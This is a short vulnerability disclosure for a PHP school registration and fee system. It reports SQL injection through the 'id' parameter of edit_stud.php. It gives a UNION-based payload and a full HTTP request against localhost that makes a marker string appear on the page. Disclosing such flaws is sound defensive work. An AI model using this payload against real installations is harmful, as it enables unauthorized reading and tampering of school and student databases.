# School Registration and Fee System v1.0 has SQL injection

BUG_Author:saintone98

Website source address:https://www.sourcecodester.com/php/10932/school-registration-and-fee-system.html

Vulnerability File: /bilal final/edit_stud.php

GET parameter 'id' exists SQL injection vulnerability

Payload: id=-1' union all select null,null,null,concat(0x71727374,0x61626364,0x51525354),null,null,null,null,null,null,null,null,null,null,null,null-- -

```
GET /bilal%20final/edit_stud.php?id=-1%27%20union%20all%20select%20null,null,null,concat(0x71727374,0x61626364,0x51525354),null,null,null,null,null,null,null,null,null,null,null,null--%20- HTTP/1.1
Host: localhost
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Cookie: PHPSESSID=2vcgmn9u7h75h5jbjdi1d2e871
Connection: close
```

The string is displayed as scheduled

![image](https://github.com/saintone98/picture/blob/main/abcd.png)
